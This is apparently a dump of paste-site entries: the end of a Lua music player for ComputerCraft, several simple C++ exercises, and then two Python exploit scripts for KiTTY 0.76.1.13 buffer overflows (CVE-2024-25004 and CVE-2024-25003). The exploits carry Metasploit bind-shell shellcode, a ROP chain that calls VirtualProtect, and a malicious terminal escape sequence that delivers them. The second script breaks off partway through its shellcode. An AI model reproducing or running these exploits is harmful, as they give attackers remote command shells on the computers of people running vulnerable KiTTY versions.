+							if str:sub(i, i) == ""1"" then
+								filter[i] = true
+							elseif str:sub(i, i) == ""0"" then
+								filter[i] = false
+							else
+								error(""invalid filter value: ""..str)
+							end
+						end
+						filters[#filters + 1] = filter
+					else
+						error(""invalid filter value: ""..str)
+					end
+				end
+			end
+			argtype = nil
+		end
+		i = i + 1
+	end
+
+	if #files == 0 then
+		addFiles("""")
+	end
+
+	i = 1
+	print(""loading tracks..."")
+	while i <= #files do
+		local track
+		pcall(function () track = wave.loadTrack(files[i]) end)
+		if not track then
+			print(""failed to load ""..files[i])
+			os.sleep(0.2)
+			table.remove(files, i)
+		else
+			tracks[i] = track
+			print(""loaded ""..files[i])
+			i = i + 1
+		end
+		if i % 10 == 0 then
+			os.sleep(0)
+		end
+	end
+	if #files == 0 then
+		error(""no tracks found"")
+	end
+
+	if #volumes == 0 then
+		volumes[1] = 1
+	end
+	if #filters == 0 then
+		filters[1] = {true, true, true, true, true}
+	end
+	if #volumes == 1 then
+		for i = 2, #outputs do
+			volumes[i] = volumes[1]
+		end
+	end
+	if #filters == 1 then
+		for i = 2, #outputs do
+			filters[i] = filters[1]
+		end
+	end
+	if #volumes ~= #outputs then
+		error(""invalid amount of volume values: ""..#volumes.."" (must be 1 or ""..#outputs.."")"")
+	end
+	if #filters ~= #outputs then
+		error(""invalid amount of filter values: ""..#filters.."" (must be 1 or ""..#outputs.."")"")
+	end
+
+	for i = 1, #outputs do
+		outputs[i].volume = volumes[i]
+		outputs[i].filter = filters[i]
+	end
+
+	context = wave.createContext()
+	context:addOutputs(outputs)
+end
+
+
+
+
+local function formatTime(secs)
+	local mins = math.floor(secs / 60)
+	secs = secs - mins * 60
+	return string.format(""%01d:%02d"", mins, secs)
+end
+
+local function drawStatic()
+	if noUI then return end
+	term.setCursorPos(1, 1)
+	term.setBackgroundColor(theme.topBar)
+	term.setTextColor(theme.topBarTitle)
+	term.write(""wave-amp"")
+	term.write(("" ""):rep(screenWidth - 25))
+	term.setTextColor(trackMode == 1 and theme.topBarOptionSelected or theme.topBarOption)
+	term.write(""nrm "")
+	term.setTextColor(trackMode == 2 and theme.topBarOptionSelected or theme.topBarOption)
+	term.write(""stp "")
+	term.setTextColor(trackMode == 3 and theme.topBarOptionSelected or theme.topBarOption)
+	term.write(""rep "")
+	term.setTextColor(trackMode == 4 and theme.topBarOptionSelected or theme.topBarOption)
+	term.write(""shf "")
+	term.setTextColor(theme.topBarClose)
+	term.write(""X"")
+
+	local scrollnub = math.floor(trackScroll / (#tracks - screenHeight + 7) * (screenHeight - 10) + 0.5) 
+
+	term.setTextColor(theme.song)
+	term.setBackgroundColor(theme.songBackground)
+	for i = 1, screenHeight - 7 do
+		local index = i + trackScroll
+		term.setCursorPos(1, i + 1)
+		term.setTextColor(index == currentTrack and theme.songSelected or theme.song)
+		term.setBackgroundColor(index == currentTrack and theme.songSelectedBackground or theme.songBackground)
+		local str = """"
+		if tracks[index] then
+			local track = tracks[index]
+			str = formatTime(track.length / track.tempo).."" ""
+			if #track.name > 0 then
+				str = str..(#track.originalAuthor == 0 and track.author or track.originalAuthor).."" - ""..track.name
+			else
+				local name = fs.getName(files[index])
+				str = str..name:sub(1, #name - 4)
+			end
+		end
+		if #str > screenWidth - 1 then
+			str = str:sub(1, screenWidth - 3)..""..""
+		end
+		term.write(str)
+		term.write(("" ""):rep(screenWidth - 1 - #str))
+		term.setBackgroundColor((i >= scrollnub + 1 and i <= scrollnub + 3) and theme.scrollBar or theme.scrollBackground)
+		if i == 1 then
+			term.setTextColor(theme.scrollButton)
+			term.write(_HOST and ""\30"" or ""^"")
+		elseif i == screenHeight - 7 then
+			term.setTextColor(theme.scrollButton)
+			term.write(_HOST and ""\31"" or ""v"")
+		else
+			term.write("" "")
+		end
+	end
+end
+
+local function drawDynamic()
+	if noUI then return end
+	for i = 1, 5 do
+		vsEasings[i] = vsEasings[i] - vsDecline
+		if vsEasings[i] < 0 then
+			vsEasings[i] = 0
+		end
+		local part = context.vs[i] > vsStep and vsStep or context.vs[i]
+		if vsEasings[i] < part then
+			vsEasings[i] = part
+		end
+		local full = math.floor(part / vsStep * screenWidth + 0.5)
+		local easing = math.floor(vsEasings[i] / vsStep * screenWidth + 0.5)
+		term.setCursorPos(1, screenHeight - 6 + i)
+		term.setBackgroundColor(theme.visualiserBar)
+		term.setTextColor(theme.visualiserBackground)
+		term.write(("" ""):rep(full))
+		term.write((_HOST and ""\127"" or ""#""):rep(math.floor((easing - full) / 2)))
+		term.setBackgroundColor(theme.visualiserBackground)
+		term.setTextColor(theme.visualiserBar)
+		term.write((_HOST and ""\127"" or ""#""):rep(math.ceil((easing - full) / 2)))
+		term.write(("" ""):rep(screenWidth - easing))
+	end
+
+	local progressnub = math.floor((instance.tick / track.length) * (screenWidth - 14) + 0.5)
+
+	term.setCursorPos(1, screenHeight)
+	term.setTextColor(theme.progressTime)
+	term.setBackgroundColor(theme.progressBackground)
+	term.write(formatTime(instance.tick / track.tempo))
+
+	term.setTextColor(theme.progressLine)
+	term.write(""\136"")
+	term.write((""\140""):rep(progressnub))
+	term.setTextColor(theme.progressNub)
+	term.setBackgroundColor(theme.progressNubBackground)
+	term.write(theme.progressNubChar)
+	term.setTextColor(theme.progressLine)
+	term.setBackgroundColor(theme.progressBackground)
+	term.write((""\140""):rep(screenWidth - 14 - progressnub))
+	term.write(""\132"")
+
+	term.setTextColor(theme.progressTime)
+	term.write(formatTime(track.length / track.tempo).."" "")
+	term.setTextColor(theme.progressButton)
+	term.write(instance.playing and (_HOST and ""|\016"" or ""|>"") or ""||"")
+end
+
+local function playSong(index)
+	if index >= 1 and index <= #tracks then
+		currentTrack = index
+		track = tracks[currentTrack]
+		context:removeInstance(1)
+		instance = context:addInstance(track, 1, trackMode ~= 2, trackMode == 3)
+		if currentTrack <= trackScroll then
+			trackScroll = currentTrack - 1
+		end
+		if currentTrack > trackScroll + screenHeight - 7 then
+			trackScroll = currentTrack - screenHeight + 7
+		end 
+		drawStatic()
+	end
+end
+
+local function nextSong()
+	if trackMode == 1 then
+		playSong(currentTrack + 1)
+	elseif trackMode == 4 then
+		playSong(math.random(#tracks))
+	end
+end
+
+local function setScroll(scroll)
+	trackScroll = scroll
+	if trackScroll > #tracks - screenHeight + 7 then
+		trackScroll = #tracks - screenHeight + 7 
+	end
+	if trackScroll < 0 then
+		trackScroll = 0
+	end
+	drawStatic()
+end
+
+local function handleClick(x, y)
+	if noUI then return end
+	if y == 1 then
+		if x == screenWidth then
+			running = false
+		elseif x >= screenWidth - 16 and x <= screenWidth - 2 and (x - screenWidth + 1) % 4 ~= 0 then
+			trackMode = math.floor((x - screenWidth + 16) / 4) + 1
+			instance.loop = trackMode == 3
+			drawStatic()
+		end
+	elseif x < screenWidth and y >= 2 and y <= screenHeight - 6 then
+		playSong(y - 1 + trackScroll)
+	elseif x == screenWidth and y == 2 then
+		setScroll(trackScroll - 2)
+	elseif x == screenWidth and y == screenHeight - 6 then
+		setScroll(trackScroll + 2)
+	elseif x == screenWidth and y >= 3 and y <= screenHeight - 7 then
+		setScroll(math.floor((y - 3) / (screenHeight - 10) * (#tracks - screenHeight + 7 ) + 0.5))
+	elseif y == screenHeight then
+		if x >= screenWidth - 1 and x <= screenWidth then
+			instance.playing = not instance.playing
+		elseif x >= 6 and x <= screenWidth - 8 then
+			instance.tick = ((x - 6) / (screenWidth - 14)) * track.length
+		end
+	end
+end
+
+local function handleScroll(x, y, scroll)
+	if noUI then return end
+	if y >= 2 and y <= screenHeight - 6 then
+		setScroll(trackScroll + scroll * 2)
+	end
+end
+
+local function handleKey(key)
+	if noInput then return end
+	if key == keys.space then
+		instance.playing = not instance.playing
+	elseif key == keys.n then
+		nextSong()
+	elseif key == keys.p then
+		playSong(currentTrack - 1)
+	elseif key == keys.m then
+		context.volume = (context.volume == 0) and 1 or 0
+	elseif key == keys.left then
+		instance.tick = instance.tick - track.tempo * 10
+		if instance.tick < 1 then
+			instance.tick = 1
+		end
+	elseif key == keys.right then
+		instance.tick = instance.tick + track.tempo * 10
+	elseif key == keys.up then
+		context.volume = (context.volume == 1) and 1 or context.volume + 0.1
+	elseif key == keys.down then
+		context.volume = (context.volume == 0) and 0 or context.volume - 0.1
+	elseif key == keys.j then
+		setScroll(trackScroll + 2)
+	elseif key == keys.k then
+		setScroll(trackScroll - 2)
+	elseif key == keys.pageUp then
+		setScroll(trackScroll - 5)
+	elseif key == keys.pageDown then
+		setScroll(trackScroll + 5)
+	elseif key == keys.leftShift then
+		trackMode = trackMode % 4 + 1
+		drawStatic()
+	elseif key == keys.backspace then
+		running = false
+	end
+end
+
+local function run()
+	playSong(1)
+	drawStatic()
+	drawDynamic()
+	local timer = os.startTimer(0.05)
+	while running do
+		local e = {os.pullEventRaw()}
+		if e[1] == ""timer"" and e[2] == timer then
+			timer = os.startTimer(0)
+			local prevtick = instance.tick
+			context:update()
+			if prevtick > 1 and instance.tick == 1 then
+				nextSong()
+			end
+			drawDynamic()
+		elseif e[1] == ""terminate"" then
+			running = false
+		elseif e[1] == ""term_resize"" then
+			screenWidth, screenHeight = term.getSize()
+		elseif e[1] == ""mouse_click"" then
+			handleClick(e[3], e[4])
+		elseif e[1] == ""mouse_scroll"" then
+			handleScroll(e[3], e[4], e[2])
+		elseif e[1] == ""key"" then
+			handleKey(e[2])
+		end
+	end
+end
+
+local function exit()
+	if noUI then return end
+	term.setBackgroundColor(colors.black)
+	term.setTextColor(colors.white)
+	term.setCursorPos(1, 1)
+	term.clear()
+end
+
+init({...})
+run()
+exit()"
+0Qm0bE4a,Geometric progression,BojidarDosev,C++,Thursday 14th of March 2024 10:09:03 AM CDT,"#include <iostream>
+#include <cstdlib>
+#include <vector>
+#include <cmath>
+
+using namespace std;
+
+int main()
+{
+	// q, n, a1, an
+	// an - posledniq chlen ; sn - sumata na chlenovete; an1 - temp chlen
+	double a1, n, q, an;
+	double sn;
+	cout << ""Purvit chlen e: "";cin >> a1; cout << ""Chastnoto e: ""; cin >> q; cout << ""Broq e ""; cin >> n; cout << endl;
+	
+	int n1 = n;
+
+	vector <double> prog = {};
+
+
+	for (int i = 1; i < n+1; i++)
+	{
+		an = a1 * pow(q, i - 1);
+		prog.push_back(an);
+	}
+
+	for (int i = 0; i <n; i++)
+	{
+		cout << prog[i] << "" "";
+	}
+
+	//cout << ""an: "" << an << endl;
+	//cout << ""sn: "" << sn << endl;
+}
+"
+Q46E2d2G,number of permutations of string A in string B,pasholnahuy,C++,Thursday 14th of March 2024 09:47:41 AM CDT,"#include <iostream>
+#include <unordered_map>
+
+using namespace std;
+
+int main() {
+    string a, b;
+    cin >> a >> b;
+    unordered_map<char, int> alf_a;
+    for (auto el: a) {
+        ++alf_a[el];
+    }
+    int cur_diff = alf_a.size();
+    unordered_map<char, int> cur_alf;
+    int ans = 0;
+    for (int i = 0; i < a.size(); ++i) {
+        ++cur_alf[b[i]];
+        if (cur_alf[b[i]] == alf_a[b[i]]) {
+            --cur_diff;
+        } else if (cur_alf[b[i]] - 1 == alf_a[b[i]]) {
+            ++cur_diff;
+        }
+        if (cur_diff == 0) ++ans;
+    }
+    for (int i = 0; i + a.size() < b.size(); ++i) {
+        --cur_alf[b[i]];
+        if (cur_alf[b[i]] == alf_a[b[i]]) {
+            --cur_diff;
+        } else if (cur_alf[b[i]] + 1 == alf_a[b[i]]) {
+            ++cur_diff;
+        }
+        ++cur_alf[b[i + a.size()]];
+        if (cur_alf[b[i + a.size()]] == alf_a[b[i + a.size()]]) {
+            --cur_diff;
+        } else if (cur_alf[b[i + a.size()]] - 1 == alf_a[b[i + a.size()]]) {
+            ++cur_diff;
+        }
+        if (cur_diff == 0) ++ans;
+    }
+    cout << ans;
+}
+//abbac
+"
+Q7VeFWC8,Arithmetic progression,BojidarDosev,C++,Thursday 14th of March 2024 09:47:33 AM CDT,"#include <iostream>
+#include <cstdlib>
+#include <vector>
+
+using namespace std;
+
+int main()
+{
+	// d, n, a1,an
+	// an - posledniq chlen ; sn - sumata na chlenovete; an1 - temp chlen
+	double a1, n, d, an;
+	double sn;
+	cout << ""Purvit chlen e: "";cin >> a1; cout << ""Razlikata e: ""; cin >> d; cout << ""Broq e ""; cin >> n; cout << endl;
+	int d1 = d;
+	
+	vector <double> prog = { };
+
+	an = a1 + (n - 1) / d;
+	sn = (a1 + an) / 2 * n;
+
+	for (int i = a1; i <= sn; i++)
+	{
+		if (i % d1 == 0)
+		{
+			prog.push_back(i);
+		}
+	}
+
+	for (int i = 0; i <n; i++)
+	{
+		cout << prog[i] << "" "";
+	}
+
+	//cout << ""an: "" << an << endl;
+	//cout << ""sn: "" << sn << endl;
+}
+"
+rn5YBPH2,DP matrix,LEGEND2004,C++,Thursday 14th of March 2024 09:34:45 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+#define int long long
+#define fastio ios_base::sync_with_stdio(0); cin.tie(0)
+
+const int N = 1e3 + 5;
+
+int a[N][N] , dp[N][N];
+
+signed main()
+{
+    fastio;
+
+    int n , m;
+    cin >> n >> m;
+    for(int i = 1; i <= n; i++){
+        for(int j = 1; j <= m; j++){
+            cin >> a[i][j];
+        }
+    }
+    for(int i = 0; i <= n; i++){
+        for(int j = 0; j <= m; j++){
+            dp[i][j] = LLONG_MAX;
+        }
+    }
+    for(int i = 1; i <= n; i++){
+        for(int j = 1; j <= m; j++){
+            if(i == 1 && j == 1)
+                dp[i][j] = a[i][j];
+            else
+                dp[i][j] = min(dp[i - 1][j] , dp[i][j - 1]) + a[i][j];
+        }
+    }
+    cout << dp[n][m];
+
+
+    /*
+    1 2 1
+    1 9 9
+    9 9 1
+
+    */
+}
+"
+2E8BguQP,minimal substring including all letters from string,pasholnahuy,C++,Thursday 14th of March 2024 09:27:46 AM CDT,"#include <iostream>
+#include <unordered_map>
+#include <unordered_set>
+
+using namespace std;
+int main() {
+    string s;
+    cin >> s;
+    unordered_set<char> alf;
+    for (auto el: s){
+        alf.insert(el);
+    }
+    unordered_map<char, int> cur_alf;
+    int l = 0;
+    int r = 0;
+    int ans = s.size();
+    while (r != s.size()){
+        while (r < s.size() && cur_alf.size() < alf.size()){
+            ++cur_alf[s[r]];
+            ++r;
+        }
+        while (cur_alf.size() == alf.size()){
+            --cur_alf[s[l]];
+            if (cur_alf[s[l]] == 0){
+                cur_alf.erase(s[l]);
+            }
+            ++l;
+        }
+        ans = min(ans, r - l + 1);
+    }
+    cout << ans;
+}
+//abbac
+"
+FJeuZ4NC,СПРИНТ № 6 | Профилируем и ускоряем | Урок 4: Упрощаем логирование,chevengur,C++,Thursday 14th of March 2024 09:08:42 AM CDT,"#include <chrono>
+#include <cstdlib>
+#include <iostream>
+#include <vector>
+#include ""log_duration.h""
+
+using namespace std;
+
+vector<int> ReverseVector(const vector<int>& source_vector) {
+    vector<int> res;
+    for (int i : source_vector) {
+        res.insert(res.begin(), i);
+    }
+
+    return res;
+}
+
+int CountPops(const vector<int>& source_vector, int begin, int end) {
+    int res = 0;
+
+    for (int i = begin; i < end; ++i) {
+        if (source_vector[i]) {
+            ++res;
+        }
+    }
+
+    return res;
+}
+
+void AppendRandom(vector<int>& v, int n) {
+    for (int i = 0; i < n; ++i) {
+        // получаем случайное число с помощью функции rand.
+        // с помощью (rand() % 2) получим целое число в диапазоне 0..1.
+        // в C++ имеются более современные генераторы случайных чисел,
+        // но в данном уроке не будем их касаться
+        v.push_back(rand() % 2);
+    }
+}
+
+void Operate() {
+    {
+        LogDuration log_operate(""Total"");
+
+        vector<int> random_bits;
+
+        // операция << для целых чисел это сдвиг всех бит в двоичной
+        // записи числа. Запишем с её помощью число 2 в степени 17 (131072)
+        static const int N = 1 << 17;
+
+        // заполним вектор случайными числами 0 и 1
+        {
+            LogDuration log(""Append random"");
+            AppendRandom(random_bits, N);
+        }
+
+        vector<int> reversed_bits;
+        // перевернём вектор задом наперёд
+        {
+            LogDuration log_reverse(""Reverse"");
+            reversed_bits = ReverseVector(random_bits);
+        }
+
+        {
+            LogDuration log_counting(""Counting"");
+            for (int i = 1, step = 1; i <= N; i += step, step *= 2) {
+                double rate = CountPops(reversed_bits, 0, i) * 100. / i;
+                cout << ""After ""s << i << "" bits we found ""s << rate << ""% pops""s << endl;
+            }
+        }
+    } 
+}
+
+int main() {
+      
+    Operate();
+}
+
+***************************************************************************************************************************************
+
+log_duration.h
+
+#pragma once
+
+#include <chrono>
+#include <iostream>
+#include <string>
+
+class LogDuration {
+public:
+    // заменим имя типа std::chrono::steady_clock
+    // с помощью using для удобства
+    using Clock = std::chrono::steady_clock;
+
+    LogDuration(const std::string name): name_operation_(name) {
+    }
+
+    ~LogDuration() {
+        using namespace std::chrono;
+        using namespace std::literals;
+
+        const auto end_time = Clock::now();
+        const auto dur = end_time - start_time_;
+        std::cerr << name_operation_ << "": ""s << duration_cast<milliseconds>(dur).count() << "" ms""s << std::endl;
+    }
+
+private:
+    const Clock::time_point start_time_ = Clock::now();
+    std::string name_operation_ = ""none"";
+};"
+kxwXiWhA,KiTTY 0.76.1.13 - 'Start Duplicated Session Username' Buffer Overflow - CVE-2024-25004,FlyFar,Python,Thursday 14th of March 2024 09:07:07 AM CDT,"# Exploit Title: KiTTY 0.76.1.13 - 'Start Duplicated Session Username' Buffer Overflow
+# Exploit Author: DEFCESCO (Austin A. DeFrancesco)
+# Vendor Homepage: https://github.com/cyd01/KiTTY/=
+# Software Link: https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip
+# Version: ≤ 0.76.1.13
+# Tested on: Microsoft Windows 11/10/8/7/XP
+# CVE: CVE-2024-25004
+#-------------------------------------------------------------------------------------#
+# Blog: https://blog.DEFCESCO.io/Hell0+KiTTY
+#-------------------------------------------------------------------------------------#
+# msf6 payload(windows/shell_bind_tcp) > to_handler                                   #
+# [*] Payload Handler Started as Job 1                                                #
+# msf6 payload(windows/shell_bind_tcp) >                                              #
+# [*] Started bind TCP handler against 192.168.100.28:4444                            #
+# [*] Command shell session 1 opened (192.168.100.119:34285 -> 192.168.100.28:4444)   # 
+#-------------------------------------------------------------------------------------#
+
+import sys
+import os
+import struct
+
+#-------------------------------------------------------------------------------------#
+# msf6 payload(windows/shell_bind_tcp) > generate -b '\x00\x07\x0a\x0d\x1b\x9c' -f py #
+# windows/shell_bind_tcp - 355 bytes                                                  #
+# https://metasploit.com/                                                             #
+# Encoder: x86/shikata_ga_nai                                                         #
+# VERBOSE=false, LPORT=4444, RHOST=192.168.100.28,                                    #
+# PrependMigrate=false, EXITFUNC=process, CreateSession=true,                         #
+# AutoVerifySession=true                                                              #
+#-------------------------------------------------------------------------------------#
+
+buf =  b""""
+buf += b""\xd9\xe9\xd9\x74\x24\xf4\xbd\xfe\xb7\xa4\x99\x5e""
+buf += b""\x29\xc9\xb1\x53\x83\xee\xfc\x31\x6e\x13\x03\x90""
+buf += b""\xa4\x46\x6c\x90\x23\x04\x8f\x68\xb4\x69\x19\x8d""
+buf += b""\x85\xa9\x7d\xc6\xb6\x19\xf5\x8a\x3a\xd1\x5b\x3e""
+buf += b""\xc8\x97\x73\x31\x79\x1d\xa2\x7c\x7a\x0e\x96\x1f""
+buf += b""\xf8\x4d\xcb\xff\xc1\x9d\x1e\xfe\x06\xc3\xd3\x52""
+buf += b""\xde\x8f\x46\x42\x6b\xc5\x5a\xe9\x27\xcb\xda\x0e""
+buf += b""\xff\xea\xcb\x81\x8b\xb4\xcb\x20\x5f\xcd\x45\x3a""
+buf += b""\xbc\xe8\x1c\xb1\x76\x86\x9e\x13\x47\x67\x0c\x5a""
+buf += b""\x67\x9a\x4c\x9b\x40\x45\x3b\xd5\xb2\xf8\x3c\x22""
+buf += b""\xc8\x26\xc8\xb0\x6a\xac\x6a\x1c\x8a\x61\xec\xd7""
+buf += b""\x80\xce\x7a\xbf\x84\xd1\xaf\xb4\xb1\x5a\x4e\x1a""
+buf += b""\x30\x18\x75\xbe\x18\xfa\x14\xe7\xc4\xad\x29\xf7""
+buf += b""\xa6\x12\x8c\x7c\x4a\x46\xbd\xdf\x03\xab\x8c\xdf""
+buf += b""\xd3\xa3\x87\xac\xe1\x6c\x3c\x3a\x4a\xe4\x9a\xbd""
+buf += b""\xad\xdf\x5b\x51\x50\xe0\x9b\x78\x97\xb4\xcb\x12""
+buf += b""\x3e\xb5\x87\xe2\xbf\x60\x3d\xea\x66\xdb\x20\x17""
+buf += b""\xd8\x8b\xe4\xb7\xb1\xc1\xea\xe8\xa2\xe9\x20\x81""
+buf += b""\x4b\x14\xcb\xbc\xd7\x91\x2d\xd4\xf7\xf7\xe6\x40""
+buf += b""\x3a\x2c\x3f\xf7\x45\x06\x17\x9f\x0e\x40\xa0\xa0""
+buf += b""\x8e\x46\x86\x36\x05\x85\x12\x27\x1a\x80\x32\x30""
+buf += b""\x8d\x5e\xd3\x73\x2f\x5e\xfe\xe3\xcc\xcd\x65\xf3""
+buf += b""\x9b\xed\x31\xa4\xcc\xc0\x4b\x20\xe1\x7b\xe2\x56""
+buf += b""\xf8\x1a\xcd\xd2\x27\xdf\xd0\xdb\xaa\x5b\xf7\xcb""
+buf += b""\x72\x63\xb3\xbf\x2a\x32\x6d\x69\x8d\xec\xdf\xc3""
+buf += b""\x47\x42\xb6\x83\x1e\xa8\x09\xd5\x1e\xe5\xff\x39""
+buf += b""\xae\x50\x46\x46\x1f\x35\x4e\x3f\x7d\xa5\xb1\xea""
+buf += b""\xc5\xd5\xfb\xb6\x6c\x7e\xa2\x23\x2d\xe3\x55\x9e""
+buf += b""\x72\x1a\xd6\x2a\x0b\xd9\xc6\x5f\x0e\xa5\x40\x8c""
+buf += b""\x62\xb6\x24\xb2\xd1\xb7\x6c""
+
+
+def shellcode():
+	sc = b'' 
+	sc += b'\xBB\x44\x24\x44\x44' # mov    ebx,0x44442444
+	sc += b'\xB8\x44\x44\x44\x44' # mov    eax,0x44444444
+	sc += b'\x29\xD8'             # sub    eax,ebx
+	sc += b'\x29\xC4'             # sub    esp,eax
+	sc += buf
+	sc += b'\x90' * (1042-len(sc))
+	assert len(sc) == 1042 
+	return sc
+
+
+def create_rop_chain():
+	# rop chain generated with mona.py - www.corelan.be
+	rop_gadgets = [
+	#[---INFO:gadgets_to_set_esi:---]
+	0x004c5832,  # POP EAX # ADD ESP,14 # POP EBX # POP ESI # RETN [kitty.exe]
+	0x006424a4,  # ptr to &VirtualProtect() [IAT kitty.exe]
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x41414141,  # Filler (compensate)
+	0x00484e07,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [kitty.exe]
+	0x00473cf6,  # XCHG EAX,ESI # RETN [kitty.exe]
+	#[---INFO:gadgets_to_set_ebp:---]
+	0x00429953,  # POP EBP # RETN [kitty.exe]
+	0x005405b0,  # PUSH ESP; RETN 0 [kitty.exe]
+	#[---INFO:gadgets_to_set_ebx:---]
+	0x0049d9f9,  # POP EBX # RETN [kitty.exe]
+	0x00000201,  # 0x00000201-> ebx
+	#[---INFO:gadgets_to_set_edx:---]
+	0x00430dce,  # POP EDX # RETN [kitty.exe]
+	0x00000040,  # 0x00000040-> edx
+	#[---INFO:gadgets_to_set_ecx:---]
+	0x005ac58c,  # POP ECX # RETN [kitty.exe]
+	0x004d81d9,  # &Writable location [kitty.exe]
+	#[---INFO:gadgets_to_set_edi:---]
+	0x004fa404,  # POP EDI # RETN [kitty.exe]
+	0x005a2001,  # RETN (ROP NOP) [kitty.exe]
+	#[---INFO:gadgets_to_set_eax:---]
+	0x004cd011,  # POP EAX # POP EBX # RETN [kitty.exe]
+	0x90909090,  # nop
+	0x41414141,  # Filler (compensate)
+	#[---INFO:pushad:---]
+	0x005dfbac,  # PUSHAD # RETN [kitty.exe]
+	]
+	return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+rop_chain = create_rop_chain()
+
+
+#----------------------------------------------------------------------------------#
+# Badchars: \x00\x07\x0a\x0d\x1b\x9c\x9d                                           #
+# Return Address Information: 0x00529720 : {pivot 324 / 0x144} :                   #
+#   ADD ESP,134 # POP EBX # POP ESI # POP EDI # POP EBP # RETN                     #
+#   ** [kitty.exe] **   |  startnull {PAGE_EXECUTE_READWRITE}                      #
+# Shellcode size at ESP: 1042 bytes                                                #
+#----------------------------------------------------------------------------------#
+
+return_address = struct.pack('<I',  0x00529720) # ADD ESP,134 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [kitty.exe] **   |  startnull {PAGE_EXECUTE_READWRITE}
+
+rop_chain_padding = b'\x90' * 27
+nops = b'\x90' * 88
+
+escape_sequence = b'\033]0;__dt:localhost:' + shellcode() + return_address
+escape_sequence += rop_chain_padding + rop_chain
+escape_sequence += b'\xE9\x3D\xFA\xFF\xFF' # jmp $eip-1471
+escape_sequence += nops + b'\007'
+
+stdout = os.fdopen(sys.stdout.fileno(), 'wb') 
+stdout.write(escape_sequence)
+stdout.flush()
+            "
+SEcAPPs1,KiTTY 0.76.1.13 - 'Start Duplicated Session Hostname' Buffer Overflow - CVE-2024-25003,FlyFar,Python,Thursday 14th of March 2024 09:05:52 AM CDT,"# Exploit Title: KiTTY 0.76.1.13 - 'Start Duplicated Session Hostname' Buffer Overflow
+# Exploit Author: DEFCESCO (Austin A. DeFrancesco)
+# Vendor Homepage: https://github.com/cyd01/KiTTY/=
+# Software Link: https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip
+# Version: ≤ 0.76.1.13
+# Tested on: Microsoft Windows 11/10/8/7/XP
+# CVE: 2024-25003
+#-------------------------------------------------------------------------------------#
+# Blog: https://blog.DEFCESCO.io/Hell0+KiTTY
+#-------------------------------------------------------------------------------------#
+# msf6 payload(windows/shell_bind_tcp) > to_handler                                   #
+# [*] Payload Handler Started as Job 1                                                #
+# msf6 payload(windows/shell_bind_tcp) >                                              #
+# [*] Started bind TCP handler against 192.168.100.28:4444                            #
+# [*] Command shell session 1 opened (192.168.100.119:39315 -> 192.168.100.28:4444)   # 
+#-------------------------------------------------------------------------------------#
+
+import sys
+import os
+import struct
+
+#---------------------------------------------------------------------------------------------#
+# msf6 payload(windows/shell_bind_tcp) > generate -b '\x00\x07\x0a\x0d\x1b\x9c\x3A\x40' -f py #
+# windows/shell_bind_tcp - 375 bytes                                                          #
+# https://metasploit.com/                                                                     #
+# Encoder: x86/xor_poly                                                                       #
+# VERBOSE=false, LPORT=4444, RHOST=192.168.100.28,                                            #
+# PrependMigrate=false, EXITFUNC=process, CreateSession=true,                                 #
+# AutoVerifySession=true                                                                      #
+#---------------------------------------------------------------------------------------------#
+
+buf =  b""""
+buf += b""\x51\x53\x56\x57\xdb\xd9\xd9\x74\x24\xf4\x5f\x41""
+buf += b""\x49\x31\xc9\x51\x59\x90\x90\x81\xe9\xae\xff\xff""
+buf += b""\xff\xbe\xd4\xa1\xc4\xf4\x31\x77\x2b\x83\xef\xfc""
+buf += b""\x51\x59\x90\xff\xc9\x75\xf3\x5f\x5e\x5b\x59\x28""
+buf += b""\x49\x46\xf4\xd4\xa1\xa4\x7d\x31\x90\x04\x90\x5f""
+buf += b""\xf1\xf4\x7f\x86\xad\x4f\xa6\xc0\x2a\xb6\xdc\xdb""
+buf += b""\x16\x8e\xd2\xe5\x5e\x68\xc8\xb5\xdd\xc6\xd8\xf4""
+buf += b""\x60\x0b\xf9\xd5\x66\x26\x06\x86\xf6\x4f\xa6\xc4""
+buf += b""\x2a\x8e\xc8\x5f\xed\xd5\x8c\x37\xe9\xc5\x25\x85""
+buf += b""\x2a\x9d\xd4\xd5\x72\x4f\xbd\xcc\x42\xfe\xbd\x5f""
+buf += b""\x95\x4f\xf5\x02\x90\x3b\x58\x15\x6e\xc9\xf5\x13""
+buf += b""\x99\x24\x81\x22\xa2\xb9\x0c\xef\xdc\xe0\x81\x30""
+buf += b""\xf9\x4f\xac\xf0\xa0\x17\x92\x5f\xad\x8f\x7f\x8c""
+buf += b""\xbd\xc5\x27\x5f\xa5\x4f\xf5\x04\x28\x80\xd0\xf0""
+buf += b""\xfa\x9f\x95\x8d\xfb\x95\x0b\x34\xfe\x9b\xae\x5f""
+buf += b""\xb3\x2f\x79\x89\xc9\xf7\xc6\xd4\xa1\xac\x83\xa7""
+buf += b""\x93\x9b\xa0\xbc\xed\xb3\xd2\xd3\x5e\x11\x4c\x44""
+buf += b""\xa0\xc4\xf4\xfd\x65\x90\xa4\xbc\x88\x44\x9f\xd4""
+buf += b""\x5e\x11\x9e\xdc\xf8\x94\x16\x29\xe1\x94\xb4\x84""
+buf += b""\xc9\x2e\xfb\x0b\x41\x3b\x21\x43\xc9\xc6\xf4\xc5""
+buf += b""\xfd\x4d\x12\xbe\xb1\x92\xa3\xbc\x63\x1f\xc3\xb3""
+buf += b""\x5e\x11\xa3\xbc\x16\x2d\xcc\x2b\x5e\x11\xa3\xbc""
+buf += b""\xd5\x28\xcf\x35\x5e\x11\xa3\x43\xc9\xb1\x9a\x99""
+buf += b""\xc0\x3b\x21\xbc\xc2\xa9\x90\xd4\x28\x27\xa3\x83""
+buf += b""\xf6\xf5\x02\xbe\xb3\x9d\xa2\x36\x5c\xa2\x33\x90""
+buf += b""\x85\xf8\xf5\xd5\x2c\x80\xd0\xc4\x67\xc4\xb0\x80""
+buf += b""\xf1\x92\xa2\x82\xe7\x92\xba\x82\xf7\x97\xa2\xbc""
+buf += b""\xd8\x08\xcb\x52\x5e\x11\x7d\x34\xef\x92\xb2\x2b""
+buf += b""\x91\xac\xfc\x53\xbc\xa4\x0b\x01\x1a\x34\x41\x76""
